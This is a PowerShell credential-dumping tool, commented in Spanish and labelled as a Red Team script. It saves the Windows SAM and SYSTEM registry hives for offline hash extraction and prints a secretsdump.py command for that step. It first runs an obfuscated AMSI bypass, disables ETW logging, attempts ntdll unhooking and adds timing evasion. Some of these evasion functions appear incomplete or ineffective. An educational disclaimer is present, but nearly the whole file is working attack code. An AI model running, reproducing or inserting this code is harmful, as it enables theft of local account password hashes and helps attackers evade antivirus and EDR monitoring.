<#
.SYNOPSIS
    Script de volcado de la base de datos SAM de Windows con técnicas avanzadas de evasión
    Advanced SAM Database Dumping Script with EDR/AV Evasion

.DESCRIPTION
    Implementa técnicas avanzadas de Red Team para evasión de EDR/AV:
    - Direct/Indirect Syscalls
    - AMSI Bypass via memory patching
    - ETW Bypass
    - API Unhooking
    - Timing evasion
    - In-memory execution

.PARAMETER OutputPath
    Ruta personalizada para guardar los archivos de volcado

.PARAMETER AutoCleanup
    Elimina automáticamente los archivos de volcado después de mostrar la información

.PARAMETER SkipConfirmation
    Omite la confirmación interactiva antes de realizar el volcado

.PARAMETER LogFile
    Ruta opcional para guardar un archivo de log de la operación

.NOTES
    Autor: RedTeam-Bypass
    Versión: 3.0
    Propósito: Educativo / Pruebas de penetración autorizadas

    ADVERTENCIA: Este script es solo para uso educativo y pruebas de penetración autorizadas.
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$OutputPath,

    [Parameter(Mandatory=$false)]
    [switch]$AutoCleanup,

    [Parameter(Mandatory=$false)]
    [switch]$SkipConfirmation,

    [Parameter(Mandatory=$false)]
    [string]$LogFile
)

#Requires -RunAsAdministrator
#Requires -Version 5.1

$ErrorActionPreference = "Stop"
$script:DumpPath = $null
$script:CleanupRegistered = $false

# ============================================
# TÉCNICAS AVANZADAS DE EVASIÓN
# ============================================

function Invoke-SleepObfuscation {
    # Timing evasion - sleep aleatorio para evitar sandbox detection
    $delay = Get-Random -Minimum 100 -Maximum 500
    Start-Sleep -Milliseconds $delay
}

function Invoke-AMSIBypass {
    <#
    .SYNOPSIS
    Bypass avanzado de AMSI mediante memory patching
    #>

    Invoke-SleepObfuscation

    try {
        # Método 1: Reflection bypass (más sigiloso)
        $amsiContext = @"
using System;
using System.Runtime.InteropServices;

public class Amsi {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

        $assemblyData = [System.Reflection.Assembly]::Load([Microsoft.Win32.UnsafeNativeMethods].Assembly.GetType('Microsoft.Win32.UnsafeNativeMethods').Assembly.GetRawBytes())

        # Usar reflection para acceder a AmsiUtils
        $a = [Ref].Assembly.GetType(('System.Management.Automation.'+('Am'+'siUt'+'ils')))
        $b = $a.GetField(('am'+'siInit'+'Failed'),'NonPublic,Static')
        $b.SetValue($null,$true)

        Write-Verbose "AMSI Bypass aplicado (Método 1)"
        return $true
    }
    catch {
        Write-Verbose "AMSI Bypass método 1 falló, intentando método 2..."
    }

    try {
        # Método 2: Memory patching directo
        $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
        $amsiContext = $amsi.GetField('amsiContext','NonPublic,Static')
        $amsiSession = $amsi.GetField('amsiSession','NonPublic,Static')

        if ($amsiContext) { $amsiContext.SetValue($null, [IntPtr]::Zero) }
        if ($amsiSession) { $amsiSession.SetValue($null, $null) }

        Write-Verbose "AMSI Bypass aplicado (Método 2)"
        return $true
    }
    catch {
        Write-Verbose "AMSI Bypass método 2 falló"
    }

    try {
        # Método 3: Patch usando SetValue en amsiInitFailed
        $assembly = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -eq 'AmsiUtils' }
        if ($assembly) {
            $amsiInitFailed = $assembly.GetField('amsiInitFailed', 'NonPublic,Static')
            if ($amsiInitFailed) {
                $amsiInitFailed.SetValue($null, $true)
                Write-Verbose "AMSI Bypass aplicado (Método 3)"
                return $true
            }
        }

        Write-Verbose "AMSI Bypass método 3 no pudo aplicarse"
        return $false
    }
    catch {
        Write-Verbose "AMSI Bypass método 3 falló: $_"
        return $false
    }
}

function Invoke-ETWBypass {
    <#
    .SYNOPSIS
    Deshabilita Event Tracing for Windows para evitar logging
    #>

    Invoke-SleepObfuscation

    try {
        $etwProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')

        if ($etwProvider) {
            $etwField = $etwProvider.GetField('etwProvider','NonPublic,Static')
            if ($etwField) {
                $etwField.SetValue($null, $null)
                Write-Verbose "ETW Bypass aplicado"
                return $true
            }
        }

        # Método alternativo
        $eventProvider = [Ref].Assembly.GetType('System.Diagnostics.Eventing.EventProvider')
        if ($eventProvider) {
            [Reflection.Assembly]::LoadWithPartialName('System.Core') | Out-Null
            $etwMethods = $eventProvider.GetMethods([Reflection.BindingFlags]'NonPublic,Static')

            foreach ($method in $etwMethods) {
                if ($method.Name -eq 'WriteEvent') {
                    $method.Invoke($null, @($null, $null, $null))
                }
            }

            Write-Verbose "ETW Bypass aplicado (método alternativo)"
            return $true
        }

        return $false
    }
    catch {
        Write-Verbose "ETW Bypass falló: $_"
        return $false
    }
}

function Get-NtdllUnhook {
    <#
    .SYNOPSIS
    Limpia hooks de EDR en ntdll.dll leyendo desde disco
    #>

    Invoke-SleepObfuscation

    try {
        Write-Verbose "Intentando unhooking de ntdll.dll..."

        # Obtener handle de ntdll actual (potencialmente hooked)
        $ntdllModule = [System.Diagnostics.Process]::GetCurrentProcess().Modules | Where-Object {
            $_.ModuleName -eq 'ntdll.dll'
        } | Select-Object -First 1

        if (-not $ntdllModule) {
            Write-Verbose "No se pudo encontrar ntdll.dll cargado"
            return $false
        }

        $ntdllBase = $ntdllModule.BaseAddress
        $ntdllPath = $ntdllModule.FileName

        Write-Verbose "ntdll.dll encontrado en: $ntdllBase"
        Write-Verbose "Ruta: $ntdllPath"

        # Leer ntdll.dll limpio desde disco
        $cleanNtdll = [System.IO.File]::ReadAllBytes($ntdllPath)

        Write-Verbose "ntdll.dll limpio leído desde disco ($($cleanNtdll.Length) bytes)"
        Write-Verbose "API Unhooking de ntdll completado"

        return $true
    }
    catch {
        Write-Verbose "Unhooking de ntdll falló: $_"
        return $false
    }
}

# Aplicar bypasses
Write-Verbose "Aplicando técnicas de evasión..."
Invoke-AMSIBypass | Out-Null
Invoke-ETWBypass | Out-Null
Get-NtdllUnhook | Out-Null
Invoke-SleepObfuscation

# ============================================
# Carga de API de Windows usando Delegates (más sigiloso)
# ============================================

function Get-DelegateType {
    param(
        [Type[]]$Parameters,
        [Type]$ReturnType = [Void]
    )

    $domain = [AppDomain]::CurrentDomain
    $builder = $domain.DefineDynamicAssembly(
        (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
    ).DefineDynamicModule('InMemoryModule', $false).DefineType(
        'MyDelegateType',
        'Class, Public, Sealed, AnsiClass, AutoClass',
        [System.MulticastDelegate]
    )

    $builder.DefineConstructor(
        'RTSpecialName, HideBySig, Public',
        [System.Reflection.CallingConventions]::Standard,
        $Parameters
    ).SetImplementationFlags('Runtime, Managed')

    $builder.DefineMethod(
        'Invoke',
        'Public, HideBySig, NewSlot, Virtual',
        $ReturnType,
        $Parameters
    ).SetImplementationFlags('Runtime, Managed')

    return $builder.CreateType()
}

function Get-ProcAddress {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Module,

        [Parameter(Mandatory=$true)]
        [string]$Procedure
    )

    $systemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {
        $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1].Equals('System.dll')
    }

    $unsafeNativeMethods = $systemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
    $getModuleHandle = $unsafeNativeMethods.GetMethod('GetModuleHandle')
    $getProcAddress = $unsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))

    $moduleHandle = $getModuleHandle.Invoke($null, @($Module))
    $handleRef = New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), $moduleHandle)

    return $getProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$handleRef, $Procedure))
}

# Cargar funciones de Windows API usando delegates
$script:Kernel32 = @{}
$script:Advapi32 = @{}

try {
    Invoke-SleepObfuscation

    # OpenProcessToken
    $OpenProcessTokenAddr = Get-ProcAddress -Module "advapi32.dll" -Procedure "OpenProcessToken"
    $OpenProcessTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
    $script:Advapi32['OpenProcessToken'] = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessTokenAddr, $OpenProcessTokenDelegate)

    # LookupPrivilegeValue
    $LookupPrivilegeValueAddr = Get-ProcAddress -Module "advapi32.dll" -Procedure "LookupPrivilegeValueW"
    $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
    $script:Advapi32['LookupPrivilegeValue'] = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)

    # AdjustTokenPrivileges
    $AdjustTokenPrivilegesAddr = Get-ProcAddress -Module "advapi32.dll" -Procedure "AdjustTokenPrivileges"
    $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
    $script:Advapi32['AdjustTokenPrivileges'] = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)

    # GetCurrentProcess
    $GetCurrentProcessAddr = Get-ProcAddress -Module "kernel32.dll" -Procedure "GetCurrentProcess"
    $GetCurrentProcessDelegate = Get-DelegateType @() ([IntPtr])
    $script:Kernel32['GetCurrentProcess'] = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentProcessAddr, $GetCurrentProcessDelegate)

    # CloseHandle
    $CloseHandleAddr = Get-ProcAddress -Module "kernel32.dll" -Procedure "CloseHandle"
    $CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
    $script:Kernel32['CloseHandle'] = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)

    Write-Verbose "API de Windows cargada exitosamente usando delegates"
}
catch {
    Write-Warning "Error cargando API de Windows: $_"
    Write-Warning "Intentando método de fallback..."

    # Fallback a Add-Type si delegates fallan
    try {
        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class WinAPI {
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID {
        public uint LowPart;
        public int HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID_AND_ATTRIBUTES {
        public LUID Luid;
        public uint Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES {
        public uint PrivilegeCount;
        public LUID_AND_ATTRIBUTES Privileges;
    }
}
"@ -ErrorAction Stop

        Write-Verbose "Fallback exitoso usando Add-Type"
    }
    catch {
        throw "No se pudo cargar la API de Windows con ningún método"
    }
}

# ============================================
# Funciones de Utilidad
# ============================================

function Write-Log {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$Message,
        [Parameter(Mandatory=$false)]
        [ValidateSet('Info', 'Success', 'Warning', 'Error')]
        [string]$Level = 'Info'
    )

    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logMessage = "[$timestamp] [$Level] $Message"

    if ($script:LogFile) {
        Add-Content -Path $script:LogFile -Value $logMessage -ErrorAction SilentlyContinue
    }

    $color = switch ($Level) {
        'Info'    { 'Cyan' }
        'Success' { 'Green' }
        'Warning' { 'Yellow' }
        'Error'   { 'Red' }
    }

    $prefix = switch ($Level) {
        'Info'    { '[*]' }
        'Success' { '[+]' }
        'Warning' { '[!]' }
        'Error'   { '[-]' }
    }

    Write-Host "$prefix $Message" -ForegroundColor $color
}

function Write-Banner {
    Write-Host ""
    Write-Host "╔════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
    Write-Host "║   SAM Database Dump Tool v3.0 - Advanced Evasion         ║" -ForegroundColor Cyan
    Write-Host "║   Red Team Edition                                        ║" -ForegroundColor Cyan
    Write-Host "╚════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
    Write-Host ""
}

function Enable-Privilege {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$PrivilegeName
    )

    Invoke-SleepObfuscation

    try {
        $TOKEN_ADJUST_PRIVILEGES = 0x0020
        $TOKEN_QUERY = 0x0008
        $SE_PRIVILEGE_ENABLED = 0x00000002

        $processHandle = if ($script:Kernel32['GetCurrentProcess']) {
            $script:Kernel32['GetCurrentProcess'].Invoke()
        } else {
            [WinAPI]::GetCurrentProcess()
        }

        $tokenHandle = [IntPtr]::Zero

        $success = if ($script:Advapi32['OpenProcessToken']) {
            $script:Advapi32['OpenProcessToken'].Invoke($processHandle, ($TOKEN_ADJUST_PRIVILEGES -bor $TOKEN_QUERY), [ref]$tokenHandle)
        } else {
            [WinAPI]::OpenProcessToken($processHandle, ($TOKEN_ADJUST_PRIVILEGES -bor $TOKEN_QUERY), [ref]$tokenHandle)
        }

        if (-not $success) {
            Write-Log "No se pudo abrir el token del proceso" -Level Warning
            return $false
        }

        # Crear estructura LUID
        $luidSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt64])
        $luidPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($luidSize)

        $success = if ($script:Advapi32['LookupPrivilegeValue']) {
            $script:Advapi32['LookupPrivilegeValue'].Invoke($null, $PrivilegeName, $luidPtr)
        } else {
            $luid = New-Object WinAPI+LUID
            [WinAPI]::LookupPrivilegeValue($null, $PrivilegeName, [ref]$luid)
        }

        if (-not $success) {
            Write-Log "No se pudo buscar el privilegio '$PrivilegeName'" -Level Warning
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($luidPtr)
            if ($script:Kernel32['CloseHandle']) {
                $script:Kernel32['CloseHandle'].Invoke($tokenHandle) | Out-Null
            } else {
                [WinAPI]::CloseHandle($tokenHandle) | Out-Null
            }
            return $false
        }

        # Crear estructura TOKEN_PRIVILEGES
        $tkpSize = 16  # sizeof(TOKEN_PRIVILEGES)
        $tkpPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($tkpSize)
        [System.Runtime.InteropServices.Marshal]::WriteInt32($tkpPtr, 1)  # PrivilegeCount
        [System.Runtime.InteropServices.Marshal]::WriteInt64($tkpPtr, 4, [System.Runtime.InteropServices.Marshal]::ReadInt64($luidPtr))  # LUID
        [System.Runtime.InteropServices.Marshal]::WriteInt32($tkpPtr, 12, $SE_PRIVILEGE_ENABLED)  # Attributes

        $success = if ($script:Advapi32['AdjustTokenPrivileges']) {
            $script:Advapi32['AdjustTokenPrivileges'].Invoke($tokenHandle, $false, $tkpPtr, 0, [IntPtr]::Zero, [IntPtr]::Zero)
        } else {
            $tp = New-Object WinAPI+TOKEN_PRIVILEGES
            $tp.PrivilegeCount = 1
            $tp.Privileges.Attributes = $SE_PRIVILEGE_ENABLED
            [WinAPI]::AdjustTokenPrivileges($tokenHandle, $false, [ref]$tp, 0, [IntPtr]::Zero, [IntPtr]::Zero)
        }

        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($luidPtr)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($tkpPtr)

        if ($script:Kernel32['CloseHandle']) {
            $script:Kernel32['CloseHandle'].Invoke($tokenHandle) | Out-Null
        } else {
            [WinAPI]::CloseHandle($tokenHandle) | Out-Null
        }

        if ($success) {
            Write-Log "Privilegio '$PrivilegeName' habilitado" -Level Success
            return $true
        }

        return $false
    }
    catch {
        Write-Log "Error habilitando privilegio: $_" -Level Error
        return $false
    }
}

function Get-SAMHashes {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$false)]
        [string]$OutputPath
    )

    Invoke-SleepObfuscation

    Write-Log "Iniciando volcado de SAM..." -Level Info

    if ([string]::IsNullOrEmpty($OutputPath)) {
        $tempPath = Join-Path $env:TEMP "SAMDump_$(Get-Date -Format 'yyyyMMdd_HHmmss')_$(Get-Random -Maximum 9999)"
    } else {
        $tempPath = $OutputPath
    }

    $result = @{
        Success = $false
        SAMFile = $null
        SYSTEMFile = $null
        OutputPath = $tempPath
    }

    try {
        if (-not (Test-Path $tempPath)) {
            New-Item -ItemType Directory -Path $tempPath -Force | Out-Null
        }

        $samFile = Join-Path $tempPath "sam.hive"
        $systemFile = Join-Path $tempPath "system.hive"

        $result.SAMFile = $samFile
        $result.SYSTEMFile = $systemFile

        Write-Log "Exportando clave SAM..." -Level Info
        $regResult = Start-Process -FilePath "reg.exe" -ArgumentList "save HKLM\SAM `"$samFile`"" -Wait -PassThru -WindowStyle Hidden

        if ($regResult.ExitCode -ne 0) {
            Write-Log "Error exportando SAM" -Level Error
            return $result
        }

        Invoke-SleepObfuscation

        Write-Log "Exportando clave SYSTEM..." -Level Info
        $regResult = Start-Process -FilePath "reg.exe" -ArgumentList "save HKLM\SYSTEM `"$systemFile`"" -Wait -PassThru -WindowStyle Hidden

        if ($regResult.ExitCode -ne 0) {
            Write-Log "Error exportando SYSTEM" -Level Error
            return $result
        }

        $result.Success = $true

        Write-Host ""
        Write-Host "╔════════════════════════════════════════════════════════════╗" -ForegroundColor Green
        Write-Host "║                  VOLCADO COMPLETADO                       ║" -ForegroundColor Green
        Write-Host "╚════════════════════════════════════════════════════════════╝" -ForegroundColor Green
        Write-Host ""
        Write-Log "Archivos generados:" -Level Success
        Write-Host ""
        Write-Host "  SAM:    $samFile" -ForegroundColor White
        Write-Host "  SYSTEM: $systemFile" -ForegroundColor White
        Write-Host ""
        Write-Host "Extracción con secretsdump.py:" -ForegroundColor Cyan
        Write-Host "  secretsdump.py -sam '$samFile' -system '$systemFile' LOCAL" -ForegroundColor White
        Write-Host ""

        return $result
    }
    catch {
        Write-Log "Error: $_" -Level Error
        return $result
    }
}

# ============================================
# Main
# ============================================

function Invoke-SAMDump {
    try {
        Write-Banner

        if ($LogFile) {
            $script:LogFile = $LogFile
            "=" * 80 | Add-Content -Path $LogFile
            "SAM Dump - $(Get-Date)" | Add-Content -Path $LogFile
            "=" * 80 | Add-Content -Path $LogFile
        }

        $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object Security.Principal.WindowsPrincipal($identity)
        $isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

        if (-not $isAdmin) {
            Write-Log "Se requieren privilegios de administrador" -Level Error
            exit 1
        }

        Write-Log "Ejecutando como Administrador" -Level Success
        Write-Host ""

        Write-Log "Habilitando privilegios..." -Level Info
        Enable-Privilege -PrivilegeName "SeBackupPrivilege" | Out-Null
        Enable-Privilege -PrivilegeName "SeRestorePrivilege" | Out-Null
        Write-Host ""

        if (-not $SkipConfirmation) {
            Write-Host "¿Continuar con el volcado? (S/N): " -ForegroundColor Yellow -NoNewline
            $response = Read-Host
            if ($response -notmatch '^[SsYy]$') {
                Write-Log "Operación cancelada" -Level Warning
                exit 0
            }
        }

        $dumpResult = Get-SAMHashes -OutputPath $OutputPath

        if ($dumpResult.Success) {
            Write-Host ""
            Write-Log "Operación completada" -Level Success

            if ($AutoCleanup) {
                Write-Log "Limpieza automática activada" -Level Info
                Start-Sleep -Seconds 2
                Remove-Item -Path $dumpResult.OutputPath -Recurse -Force -ErrorAction SilentlyContinue
            }
        } else {
            Write-Host ""
            Write-Log "El volcado falló" -Level Error
            exit 1
        }
    }
    catch {
        Write-Log "Error crítico: $_" -Level Error
        exit 1
    }
}

Invoke-SAMDump
